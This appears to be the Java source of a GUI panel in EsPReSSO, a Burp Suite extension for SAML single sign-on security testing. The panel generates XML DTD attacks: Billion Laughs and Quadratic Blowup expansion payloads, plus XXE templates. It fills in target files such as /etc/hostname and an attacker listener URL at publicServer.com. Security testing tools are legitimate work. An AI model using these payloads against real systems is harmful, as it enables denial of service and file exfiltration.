/**
 * EsPReSSO - Extension for Processing and Recognition of Single Sign-On Protocols.
 * Copyright (C) 2015 Tim Guenther and Christian Mainka
 *
 * This program is free software; you can redistribute it and/or modify it under
 * the terms of the GNU General Public License as published by the Free Software
 * Foundation; either version 2 of the License, or (at your option) any later
 * version.
 *
 * This program is distributed in the hope that it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
 * FOR A PARTICULAR PURPOSE. See the GNU General Public License for more
 * details.
 *
 * You should have received a copy of the GNU General Public License along with
 * this program; if not, write to the Free Software Foundation, Inc., 51
 * Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.
 */
package de.rub.nds.burp.espresso.gui.attacker.saml;

import de.rub.nds.burp.espresso.gui.attacker.IAttack;
import de.rub.nds.burp.utilities.Logging;
import de.rub.nds.burp.utilities.XMLHelper;
import de.rub.nds.burp.utilities.listeners.AbstractCodeEvent;
import de.rub.nds.burp.utilities.listeners.CodeListenerController;
import de.rub.nds.burp.utilities.listeners.saml.SamlCodeEvent;
import java.awt.Dimension;
import java.awt.GridLayout;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.File;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Collections;
import java.util.regex.Pattern;
import javax.swing.DefaultComboBoxModel;
import javax.swing.JScrollPane;
import javax.swing.JTextArea;
import javax.swing.ScrollPaneConstants;
import javax.swing.event.DocumentEvent;
import javax.swing.event.DocumentListener;
import org.apache.commons.io.FileUtils;
import org.w3c.dom.Document;
import org.w3c.dom.Element;

/**
 * The DTD Attack
 * @author Nurullah Erinola
 * @version 1.0
 */
public class UIDTDAttack extends javax.swing.JPanel implements IAttack{
    
    private final String listenURL = "§tf_listenURL§";
    private final String helperURL = "§tf_helperURL§";
    private final String targetFILE = "§tf_targetFILE§";
    
    private int pos;
    private String code = "";
    private String selectedDtdServer = "";
    private String selectedDtdHelper = "";
    private String currentDtdServer = "";
    private String currentDtdHelper = "";
    private CodeListenerController listeners = null;
    private ArrayList<Document> dtds;
    private ArrayList<String> dtdNames;
    private boolean needEditor = false;
    
    private JTextArea firstEditor;
    private JTextArea secondEditor;
    private JScrollPane firstScrollPane;
    private JScrollPane secondScrollPane;
    
    /**
     * Creates new form UIDTDAttack
     */
    public UIDTDAttack() {
        initComponents();       
        initEditorsAndListener();
        readDTDs();
    }

    /**
     * This method is called from within the constructor to initialize the form.
     * WARNING: Do NOT modify this code. The content of this method is always
     * regenerated by the Form Editor.
     */
    @SuppressWarnings("unchecked")
    // <editor-fold defaultstate="collapsed" desc="Generated Code">//GEN-BEGIN:initComponents
    private void initComponents() {

        sysPubButtonGroup = new javax.swing.ButtonGroup();
        modifyButton = new javax.swing.JButton();
        jLabel3 = new javax.swing.JLabel();
        jLabel4 = new javax.swing.JLabel();
        recursiveEntitieTextField = new javax.swing.JTextField();
        entityReferencesTextField = new javax.swing.JTextField();
        jLabel5 = new javax.swing.JLabel();
        jLabel6 = new javax.swing.JLabel();
        jLabel7 = new javax.swing.JLabel();
        targetFileTextField = new javax.swing.JTextField();
        helperURLTextField = new javax.swing.JTextField();
        attackeListenerTextField = new javax.swing.JTextField();
        jScrollPane3 = new javax.swing.JScrollPane();
        targetFileList = new javax.swing.JList<>();
        dtdComboBox = new javax.swing.JComboBox<>();
        jLabel8 = new javax.swing.JLabel();
        jLabel9 = new javax.swing.JLabel();
        adjustDTDButton = new javax.swing.JButton();
        jPanel1 = new javax.swing.JPanel();
        enableEditoringCheckbox = new javax.swing.JCheckBox();
        publicRadioButton = new javax.swing.JRadioButton();
        systemRadioButton = new javax.swing.JRadioButton();

        modifyButton.setText("Modify");
        modifyButton.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                modifyButtonActionPerformed(evt);
            }
        });

        jLabel3.setText("Recursive Entities:");

        jLabel4.setText("Entity References:");

        recursiveEntitieTextField.setHorizontalAlignment(javax.swing.JTextField.CENTER);
        recursiveEntitieTextField.setEnabled(false);

        entityReferencesTextField.setHorizontalAlignment(javax.swing.JTextField.CENTER);
        entityReferencesTextField.setEnabled(false);

        jLabel5.setText("Target File:");

        jLabel6.setText("Helper-URL:");

        jLabel7.setText("Attacker Listener:");

        targetFileTextField.setEnabled(false);

        helperURLTextField.setEnabled(false);

        attackeListenerTextField.setEnabled(false);

        targetFileList.setModel(new javax.swing.AbstractListModel<String>() {
            String[] strings = { "file:///etc/hostname", "file:///dev/urandom", "file:///sys/power/image_size" };
            public int getSize() { return strings.length; }
            public String getElementAt(int i) { return strings[i]; }
        });
        targetFileList.setSelectionMode(javax.swing.ListSelectionModel.SINGLE_INTERVAL_SELECTION);
        targetFileList.setEnabled(false);
        targetFileList.addListSelectionListener(new javax.swing.event.ListSelectionListener() {
            public void valueChanged(javax.swing.event.ListSelectionEvent evt) {
                targetFileListValueChanged(evt);
            }
        });
        jScrollPane3.setViewportView(targetFileList);

        dtdComboBox.setMaximumRowCount(10);
        dtdComboBox.setToolTipText("");
        dtdComboBox.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                dtdComboBoxActionPerformed(evt);
            }
        });

        jLabel8.setText("Select DTD:");

        jLabel9.setText("Selected DTD: ");

        adjustDTDButton.setText("Adjust");
        adjustDTDButton.setToolTipText("Write only numbers.");
        adjustDTDButton.setEnabled(false);
        adjustDTDButton.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                adjustDTDButtonActionPerformed(evt);
            }
        });

        javax.swing.GroupLayout jPanel1Layout = new javax.swing.GroupLayout(jPanel1);
        jPanel1.setLayout(jPanel1Layout);
        jPanel1Layout.setHorizontalGroup(
            jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGap(0, 0, Short.MAX_VALUE)
        );
        jPanel1Layout.setVerticalGroup(
            jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGap(0, 294, Short.MAX_VALUE)
        );

        enableEditoringCheckbox.setText("Enable editoring");
        enableEditoringCheckbox.setToolTipText("After enabling and disabling, all changes are reset to default.");
        enableEditoringCheckbox.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                enableEditoringCheckboxActionPerformed(evt);
            }
        });

        sysPubButtonGroup.add(publicRadioButton);
        publicRadioButton.setText("PUBLIC");
        publicRadioButton.setEnabled(false);

        sysPubButtonGroup.add(systemRadioButton);
        systemRadioButton.setText("SYSTEM");
        systemRadioButton.setEnabled(false);

        javax.swing.GroupLayout layout = new javax.swing.GroupLayout(this);
        this.setLayout(layout);
        layout.setHorizontalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(layout.createSequentialGroup()
                .addContainerGap()
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addComponent(jPanel1, javax.swing.GroupLayout.Alignment.TRAILING, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                    .addComponent(dtdComboBox, 0, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                    .addGroup(layout.createSequentialGroup()
                        .addGap(0, 1044, Short.MAX_VALUE)
                        .addComponent(modifyButton))
                    .addGroup(layout.createSequentialGroup()
                        .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                            .addGroup(layout.createSequentialGroup()
                                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.TRAILING)
                                    .addGroup(layout.createSequentialGroup()
                                        .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                                            .addComponent(jLabel3)
                                            .addComponent(jLabel4))
                                        .addGap(1, 1, 1)
                                        .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING, false)
                                            .addGroup(layout.createSequentialGroup()
                                                .addComponent(adjustDTDButton)
                                                .addGap(68, 68, 68)
                                                .addComponent(jLabel6))
                                            .addGroup(layout.createSequentialGroup()
                                                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.TRAILING, false)
                                                    .addComponent(entityReferencesTextField, javax.swing.GroupLayout.Alignment.LEADING, javax.swing.GroupLayout.DEFAULT_SIZE, 78, Short.MAX_VALUE)
                                                    .addComponent(recursiveEntitieTextField, javax.swing.GroupLayout.Alignment.LEADING))
                                                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                                                .addComponent(jLabel5))))
                                    .addComponent(jLabel7))
                                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                                    .addGroup(layout.createSequentialGroup()
                                        .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                                            .addComponent(targetFileTextField, javax.swing.GroupLayout.PREFERRED_SIZE, 260, javax.swing.GroupLayout.PREFERRED_SIZE)
                                            .addComponent(helperURLTextField, javax.swing.GroupLayout.Alignment.TRAILING, javax.swing.GroupLayout.PREFERRED_SIZE, 260, javax.swing.GroupLayout.PREFERRED_SIZE))
                                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.UNRELATED)
                                        .addComponent(jScrollPane3, javax.swing.GroupLayout.PREFERRED_SIZE, 218, javax.swing.GroupLayout.PREFERRED_SIZE))
                                    .addComponent(attackeListenerTextField, javax.swing.GroupLayout.PREFERRED_SIZE, 260, javax.swing.GroupLayout.PREFERRED_SIZE)))
                            .addGroup(layout.createSequentialGroup()
                                .addComponent(systemRadioButton)
                                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                                .addComponent(publicRadioButton))
                            .addGroup(layout.createSequentialGroup()
                                .addComponent(jLabel9)
                                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                                .addComponent(enableEditoringCheckbox))
                            .addComponent(jLabel8))
                        .addGap(0, 0, Short.MAX_VALUE)))
                .addContainerGap())
        );
        layout.setVerticalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(layout.createSequentialGroup()
                .addContainerGap()
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addGroup(layout.createSequentialGroup()
                        .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                            .addComponent(jLabel3)
                            .addComponent(recursiveEntitieTextField, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                            .addComponent(jLabel5)
                            .addComponent(targetFileTextField, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE))
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                        .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                            .addComponent(jLabel4)
                            .addComponent(entityReferencesTextField, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE))
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                        .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                            .addComponent(adjustDTDButton)
                            .addComponent(jLabel6)
                            .addComponent(helperURLTextField, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)))
                    .addComponent(jScrollPane3, javax.swing.GroupLayout.PREFERRED_SIZE, 61, javax.swing.GroupLayout.PREFERRED_SIZE))
                .addGap(0, 0, 0)
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(jLabel7)
                    .addComponent(attackeListenerTextField, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE))
                .addGap(3, 3, 3)
                .addComponent(jLabel8)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(dtdComboBox, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(publicRadioButton)
                    .addComponent(systemRadioButton))
                .addGap(1, 1, 1)
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(jLabel9)
                    .addComponent(enableEditoringCheckbox))
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(jPanel1, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(modifyButton)
                .addContainerGap(javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
        );
    }// </editor-fold>//GEN-END:initComponents
    
    private void modifyButtonActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_modifyButtonActionPerformed
        notifyAllTabs(firstEditor.getText());
        Logging.getInstance().log(getClass(), "Notify all tabs.", Logging.DEBUG);
    }//GEN-LAST:event_modifyButtonActionPerformed
       
    private void targetFileListValueChanged(javax.swing.event.ListSelectionEvent evt) {//GEN-FIRST:event_targetFileListValueChanged
        targetFileTextField.setText(targetFileList.getSelectedValue());
    }//GEN-LAST:event_targetFileListValueChanged

    private void adjustDTDButtonActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_adjustDTDButtonActionPerformed
	switch(dtds.get(pos).getElementsByTagName("name").item(0).getTextContent()) {
            case "Billion Laughs Attack":
                if (Pattern.matches("[0-9]+", recursiveEntitieTextField.getText()) && Pattern.matches("[0-9]+", entityReferencesTextField.getText())) {
                    String tmp = "\n";
                    int rec = Integer.parseInt(recursiveEntitieTextField.getText());
                    int entity = Integer.parseInt(entityReferencesTextField.getText());
                    for (int i = 1; i <= rec; i++) {
                        tmp += "<!ENTITY a" + i + " \"";		
                        for (int j = 1; j <= entity; j++) {
                            tmp += "&a" + (i-1);
                        }
                        tmp += "\">\n";
                    }
                    tmp += "]>\n" + "<data>&a" + rec + ";</data>";
                    currentDtdServer = selectedDtdServer.substring(0, selectedDtdServer.lastIndexOf("\"dos\" >")+7).concat(tmp); 
                }    
                break;
            case "Billion Laughs Attack with Parameter Entities":
                if (Pattern.matches("[0-9]+", recursiveEntitieTextField.getText()) && Pattern.matches("[0-9]+", entityReferencesTextField.getText())) {
                    String tmp = "\n";
                    int rec = Integer.parseInt(recursiveEntitieTextField.getText());
                    int entity = Integer.parseInt(entityReferencesTextField.getText());
                    for (int i = 1; i <= rec; i++) {
                        tmp += "<!ENTITY a" + i + " \"";		
                        for (int j = 1; j <= entity; j++) {
                            tmp += "&a" + (i-1);
                        }
                        tmp += "\">\n";
                    }
                    tmp += "<!ENTITY g  \"%a" + rec + ";\">";
                    currentDtdHelper = selectedDtdHelper.substring(0, selectedDtdHelper.lastIndexOf("\"dos\" >")+7).concat(tmp); 
                } 
                break;
            case "Quadratic Blowup Attack":
                if (Pattern.matches("[0-9]+", entityReferencesTextField.getText())) {
                    int entity = Integer.parseInt(entityReferencesTextField.getText());
                    String tmp = "";
                    for (int i = 1; i <= entity; i++) {
                        tmp += "&a0;";
                    }
                    tmp += "</data>";
                    currentDtdServer = selectedDtdServer.substring(0, selectedDtdServer.lastIndexOf("<data>")+6).concat(tmp); 
                } 
                break;
        }
        setDTD();
    }//GEN-LAST:event_adjustDTDButtonActionPerformed

    private void enableEditoringCheckboxActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_enableEditoringCheckboxActionPerformed
        if(enableEditoringCheckbox.isSelected()) {
            disableFields();
            firstEditor.setEditable(true);
            secondEditor.setEditable(true);
        } else {
            dtdComboBox.setSelectedItem(dtdNames.get(pos));
            firstEditor.setEditable(false);
            secondEditor.setEditable(false);           
        }
    }//GEN-LAST:event_enableEditoringCheckboxActionPerformed

    private void dtdComboBoxActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_dtdComboBoxActionPerformed
        disableFields();
        // Enable fields
        pos = dtdNames.indexOf(dtdComboBox.getSelectedItem());
        needEditor = dtds.get(pos).getElementsByTagName("externalResources").item(0).getTextContent().equalsIgnoreCase("TRUE");
        if (dtds.get(pos).getElementsByTagName("dosbox").item(0).getTextContent().equalsIgnoreCase("TRUE")) {
            if(!dtds.get(pos).getElementsByTagName("name").item(0).getTextContent().equalsIgnoreCase("Quadratic Blowup Attack")) {
                recursiveEntitieTextField.setEnabled(true);
            }
            entityReferencesTextField.setEnabled(true);
            adjustDTDButton.setEnabled(true);
        }
        if (dtds.get(pos).getElementsByTagName("targetFile").item(0).getTextContent().equalsIgnoreCase("TRUE")) {
            targetFileTextField.setEnabled(true);
            targetFileList.setEnabled(true);
        }
        if (dtds.get(pos).getElementsByTagName("helperURL").item(0).getTextContent().equalsIgnoreCase("TRUE")) {
            helperURLTextField.setEnabled(true);
        }            
        if (dtds.get(pos).getElementsByTagName("attackListenerURL").item(0).getTextContent().equalsIgnoreCase("TRUE")) {
            attackeListenerTextField.setEnabled(true);
        }
        if (dtds.get(pos).getElementsByTagName("attackvector").getLength() != 1) {
            systemRadioButton.setEnabled(true);
            systemRadioButton.setSelected(true);
            publicRadioButton.setEnabled(true);
        }
        // Read vectors
        Element eElement = (Element) dtds.get(pos).getElementsByTagName("attackvector").item(0);
        selectedDtdServer = eElement.getElementsByTagName("directMessage").item(0).getTextContent();
        currentDtdServer = selectedDtdServer;
        if(needEditor) {
            selectedDtdHelper = eElement.getElementsByTagName("helperMessage").item(0).getTextContent();
            currentDtdHelper = selectedDtdHelper;
            jPanel1.setLayout(new GridLayout(1, 2));
            jPanel1.removeAll();
            jPanel1.add(firstScrollPane);
            jPanel1.add(secondScrollPane);
        } else {
            jPanel1.setLayout(new GridLayout(1, 1));
            jPanel1.removeAll();
            jPanel1.add(firstScrollPane);
        }
        setDTD();
        setDefaultValues();
    }//GEN-LAST:event_dtdComboBoxActionPerformed
 
    /**
     * Set DTDs in textfields.
     */  
    private void setDTD() {
        firstEditor.setText(currentDtdServer);
        if(needEditor) {
            secondEditor.setText(currentDtdHelper);
        }
    }
    
    /**
     * Read all DTDs from resources and save it.
     */    
    private void readDTDs() {
        dtds = new ArrayList<>();
        dtdNames = new ArrayList<>();
        File dir = new File(System.getProperty("user.home")+"/NDS/nds_git/BurpSSOExtension-Development/src/main/resources/dtd");
        File[] files = dir.listFiles();
        for (File config : files) {
            try {
                Document dtd = XMLHelper.stringToDom(FileUtils.readFileToString(config, "UTF-8"));
                dtds.add(dtd);
                dtdNames.add(dtd.getElementsByTagName("name").item(0).getTextContent());
            } catch (IOException ex) {
                Logging.getInstance().log(getClass(), config.getPath() + " can not read", Logging.DEBUG);
            }
        }
        // Set dtd vectors sorted by name
        ArrayList<String> sortedDTDNames = new ArrayList<>(dtdNames);
        Collections.sort(sortedDTDNames);
        dtdComboBox.setModel(new DefaultComboBoxModel<>(sortedDTDNames.toArray(new String[sortedDTDNames.size()])));
        dtdComboBox.setSelectedItem(0);
    }
    
    private void initEditorsAndListener() {
        firstEditor = new JTextArea();
        firstEditor.setEditable(false);
        secondEditor = new JTextArea();
        secondEditor.setEditable(false);
        firstScrollPane = new JScrollPane (firstEditor, ScrollPaneConstants.VERTICAL_SCROLLBAR_AS_NEEDED, ScrollPaneConstants.HORIZONTAL_SCROLLBAR_AS_NEEDED);
        firstScrollPane.setPreferredSize(new Dimension(100, 280));
        secondScrollPane = new JScrollPane (secondEditor, ScrollPaneConstants.VERTICAL_SCROLLBAR_AS_NEEDED, ScrollPaneConstants.HORIZONTAL_SCROLLBAR_AS_NEEDED);
        secondScrollPane.setPreferredSize(new Dimension(100, 280));
        // Set listener
        TextfieldListener textfieldListener = new TextfieldListener();
        attackeListenerTextField.getDocument().addDocumentListener(textfieldListener);
        helperURLTextField.getDocument().addDocumentListener(textfieldListener);
        targetFileTextField.getDocument().addDocumentListener(textfieldListener);
        RadioButtonGroupListener radioButtonGroupListener = new RadioButtonGroupListener();
        publicRadioButton.addActionListener(radioButtonGroupListener);
        systemRadioButton.addActionListener(radioButtonGroupListener);
    }

     /**
     * Disable fields
     */
    private void disableFields() {
        systemRadioButton.setEnabled(false);
        publicRadioButton.setEnabled(false);
        adjustDTDButton.setEnabled(false);
        entityReferencesTextField.setEnabled(false);
        recursiveEntitieTextField.setEnabled(false);
        targetFileTextField.setEnabled(false);
        targetFileList.setEnabled(false);
        helperURLTextField.setEnabled(false);
        attackeListenerTextField.setEnabled(false);
    }

    /**
     * Set default values
     */
    private void setDefaultValues() {
        recursiveEntitieTextField.setText("4");
        entityReferencesTextField.setText("10");
        targetFileList.clearSelection();
        targetFileTextField.setText("file:///etc/hostname");
        helperURLTextField.setText("http://publicServer.com/helperDTD.dtd");
        attackeListenerTextField.setText("http://publicServer.com/");
    }  
    
    /**
     * Is called every time new Code is available.
     * @param evt {@link de.rub.nds.burp.utilities.listeners.AbstractCodeEvent} The new source code.
     */
    @Override
    public void setCode(AbstractCodeEvent evt) {
        this.code = evt.getCode();
    }

    /**
     * Notify all registered listeners with the new code.
     * @param code The new source code.
     */
    @Override
    public void notifyAllTabs(String code) {
        if(listeners != null){
            listeners.notifyAll(new SamlCodeEvent(this, code));
        }
    }

    /**
     * Set the listener for the editor.
     * @param listeners {@link de.rub.nds.burp.utilities.listeners.CodeListenerController}
     */
    @Override
    public void setListener(CodeListenerController listeners) {
        this.listeners = listeners;
        this.listeners.addCodeListener(this);
    }
    
    class RadioButtonGroupListener implements ActionListener {
      @Override
      public void actionPerformed(ActionEvent ev) {
        Element eElement;
        if(systemRadioButton.isSelected()) {
            eElement = (Element) dtds.get(pos).getElementsByTagName("attackvector").item(0);
        } else {
            eElement = (Element) dtds.get(pos).getElementsByTagName("attackvector").item(1);
        }
        selectedDtdServer = eElement.getElementsByTagName("directMessage").item(0).getTextContent();
        currentDtdServer = selectedDtdServer;
        if(needEditor) {
            selectedDtdHelper = eElement.getElementsByTagName("helperMessage").item(0).getTextContent();
            currentDtdHelper = selectedDtdHelper;
        }
        setDTD();
        setDefaultValues();
      }
    }
    
    /**
     * Listener for textfields.
     */
    class TextfieldListener implements DocumentListener {      
        
        private void update(DocumentEvent de) {
            currentDtdServer = selectedDtdServer;
            if(selectedDtdServer.contains(listenURL)) {
                currentDtdServer = currentDtdServer.replace(listenURL, attackeListenerTextField.getText());
            }
            if(selectedDtdServer.contains(helperURL)) {
                currentDtdServer = currentDtdServer.replace(helperURL, helperURLTextField.getText());
            }
            if(selectedDtdServer.contains(targetFILE)) {
                currentDtdServer = currentDtdServer.replace(targetFILE, targetFileTextField.getText());
            }
            if(needEditor) {
                currentDtdHelper = selectedDtdHelper;
                if(selectedDtdHelper.contains(listenURL)) {
                    currentDtdHelper = currentDtdHelper.replace(listenURL, attackeListenerTextField.getText());
                }
                if(selectedDtdHelper.contains(helperURL)) {
                    currentDtdHelper = currentDtdHelper.replace(helperURL, helperURLTextField.getText());
                }
                if(selectedDtdHelper.contains(targetFILE)) {
                    currentDtdHelper = currentDtdHelper.replace(targetFILE, targetFileTextField.getText());
                }                
            }
            setDTD();
        }
        
        @Override
        public void insertUpdate(DocumentEvent de) {
            update(de);
        }
        
        @Override
        public void removeUpdate(DocumentEvent de) {
            update(de);
        }

        @Override
        public void changedUpdate(DocumentEvent de) {
            update(de);
        }        
    }
    
    // Variables declaration - do not modify//GEN-BEGIN:variables
    private javax.swing.JButton adjustDTDButton;
    private javax.swing.JTextField attackeListenerTextField;
    private javax.swing.JComboBox<String> dtdComboBox;
    private javax.swing.JCheckBox enableEditoringCheckbox;
    private javax.swing.JTextField entityReferencesTextField;
    private javax.swing.JTextField helperURLTextField;
    private javax.swing.JLabel jLabel3;
    private javax.swing.JLabel jLabel4;
    private javax.swing.JLabel jLabel5;
    private javax.swing.JLabel jLabel6;
    private javax.swing.JLabel jLabel7;
    private javax.swing.JLabel jLabel8;
    private javax.swing.JLabel jLabel9;
    private javax.swing.JPanel jPanel1;
    private javax.swing.JScrollPane jScrollPane3;
    private javax.swing.JButton modifyButton;
    private javax.swing.JRadioButton publicRadioButton;
    private javax.swing.JTextField recursiveEntitieTextField;
    private javax.swing.ButtonGroup sysPubButtonGroup;
    private javax.swing.JRadioButton systemRadioButton;
    private javax.swing.JList<String> targetFileList;
    private javax.swing.JTextField targetFileTextField;
    // End of variables declaration//GEN-END:variables
}